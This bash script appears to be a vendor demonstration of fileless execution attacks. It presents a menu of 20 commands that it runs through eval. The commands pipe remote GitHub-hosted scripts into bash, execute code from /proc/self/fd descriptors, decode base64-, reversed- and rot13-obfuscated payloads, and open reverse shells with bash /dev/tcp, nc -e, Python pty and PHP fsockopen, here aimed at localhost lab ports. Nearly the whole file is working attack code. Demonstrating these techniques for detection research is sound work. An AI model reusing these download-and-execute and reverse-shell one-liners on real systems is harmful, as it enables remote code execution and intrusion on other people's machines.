#!/usr/bin/env bash
set -euo pipefail

# Color Setup
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
CYAN=$(tput setaf 6)
BOLD=$(tput bold)
RESET=$(tput sgr0)

# Banner
command -v figlet >/dev/null || { echo "figlet is required. Install it: sudo apt install figlet"; exit 1; }
clear
figlet "upwind.io"
echo -e "${CYAN}${BOLD}Fileless Execution Demonstration by Lior Boehm${RESET}\n"

# Lab config
LHOST="127.0.0.1"
LPORT1="4444"
LPORT2="5555"
LPORT3="9001"

# Payloads (with working GitHub URLs)
commands=(
"curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh | bash"
"exec 3< <(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh); bash /proc/self/fd/3"
"echo 'ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK' | base64 -d | bash"
"exec 3< <(echo 'hs.llehsdaolp/moc.buhtig.niam/omed-noitucexe-sselif/mbrloi//:sptth' | rev | xargs curl -s); bash /proc/self/fd/3"
"exec 3< /bin/bash; /proc/self/fd/3 -c 'curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/liorb-fileless.sh | bash'"
"X=\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py); python3 -c \"\$X\""
"python3 -c 'import urllib.request, types; mod = types.ModuleType(\"tmp\"); exec(urllib.request.urlopen(\"https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py\").read().decode(), mod.__dict__)'"
"perl -MIO -e 'print q(dummy) if 1'"
"timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1' &"
"timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &"
"timeout 2s python3 -c 'import os,pty,socket,sys,time; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &"
"bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh | sed 's/PLACEHOLDER/real/')\""
"bash -c \"\$(echo 'ENFUGBYY' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)\""
"/bin/sh -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/liorb-fileless.sh)\""
"exec 8< <(echo 'ZWNobyBoZWxsbw==' | base64 -d); bash /proc/self/fd/8"
"timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1' &"
"exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&\$FD; cat <&\$FD &"
"bash -c \"\$(python3 -c 'import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen(\"https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt\").read()).decode())')\""
"timeout 2s php -r '\$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &"
"exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9"
)

# Command runner
run_cmd() {
  local idx=$1
  local cmd="${commands[$idx]}"
  echo -e "\n${YELLOW}[+] Running attack $((idx+1)):${RESET}\n${GREEN}${cmd}${RESET}\n"
  ( eval "$cmd" ) &
}

# Menu loop
while true; do
  echo -e "\n${CYAN}${BOLD}================== Attack Menu ==================${RESET}"
  for i in "${!commands[@]}"; do
    printf "  %2d) %s\n" "$((i+1))" "${commands[$i]%%$'\n'*}"
  done
  echo -e "   a) ${BOLD}Run ALL attacks${RESET}"
  echo -e "   q) ${BOLD}Quit${RESET}"
  read -rp $'\n'"Select option [1-20 | a | q]: " choice

  case "$choice" in
    [1-9]|1[0-9]|20) run_cmd $((choice-1)) ;;
    [Aa])            for i in "${!commands[@]}"; do run_cmd "$i"; done ;;
    [Qq])            echo -e "${RED}Bye!${RESET}"; exit 0 ;;
    *)               echo -e "${RED}!! Invalid choice${RESET}" ;;
  esac
done
